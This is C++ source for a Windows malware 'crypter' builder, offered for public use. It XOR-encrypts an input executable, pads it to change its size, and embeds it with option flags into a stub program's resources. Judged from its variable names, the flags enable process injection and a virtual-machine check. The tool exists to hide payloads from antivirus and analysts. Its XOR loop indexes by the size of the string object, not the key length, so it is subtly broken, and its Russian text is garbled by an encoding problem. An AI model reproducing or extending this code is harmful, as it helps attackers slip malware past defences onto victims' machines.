#pragma warning (disable:4996)
#include <iostream>
#include <Windows.h>
#include <fstream>
#include <vector>
#include "../../Key.h"

using namespace std;

void WriteResources(LPTSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize)
{
	HANDLE hResource = NULL;
	hResource = BeginUpdateResource(szTargetPE, FALSE);
	UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(id), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID)lpBytes, dwSize);
	EndUpdateResource(hResource, FALSE);
}

void XORCrypt(const string& key, vector<unsigned char>& bytes)
{
	for (int i = 0; i < bytes.size(); ++i)
		bytes[i] ^= key[i % sizeof(key)];
}

int main()
{
	setlocale(LC_ALL, "Russian");
	string input_file, output_file;
	cout << "��� ��������� ���� ������� @atyonekilla ��� ���������� �������������: \n";	
	cout << "This program was create public using, please don`t delete author @atyonekilla: \n";	
	Sleep(2000); system("cls");
	//Main Functions
	cout << "������� ��� �������� �����: ";
	cin >> input_file;
	cout << endl << "������� ��� ��������� �����: ";
	cin >> output_file;

	CopyFile("Stub.exe", output_file.c_str(), FALSE);
	// �� ���� ������� �� �������� ��� ����������� ������ ��� ��������� ����� (��������� �����)
	
	vector<unsigned char> file_bytes, settings;

	HANDLE hFile = CreateFile(input_file.c_str(), GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD file_size = GetFileSize(hFile, NULL), bytes;
	file_bytes.resize(file_size);
	ReadFile(hFile, (LPVOID)(file_bytes.data()), file_size, &bytes, NULL);
	CloseHandle(hFile);

	if (file_size != bytes)
	{
		MessageBox(0, "�������� � ������!", "", 0);
		return 0;
	}

	int pump_factor;
	cout << "�������� ��� (������ 0 - ���� ���): ";
	cin >> pump_factor;

	for (int i = 0; i < pump_factor * 1000; ++i)
		file_bytes.push_back('0');

	XORCrypt(key, file_bytes);

	int bInject, bCheckVm;
	cout << "����� �� ������ � ��������� �������: ";
	cin >> bInject;

	if (bInject == 1)
		settings.push_back('1');
	else
		settings.push_back('0');
	
	cout << endl << "����� �� �������� �� ����������� ������: ";
	cin >> bCheckVm;

	if (bCheckVm == 1)
		settings.push_back('1');
	else
		settings.push_back('0');

	char* output = (char*)(output_file.c_str());
	WriteResources(output, 1, (BYTE*)settings.data(), settings.size());

	WriteResources(output, 2, (BYTE*)file_bytes.data(), file_bytes.size());

	system("pause");
}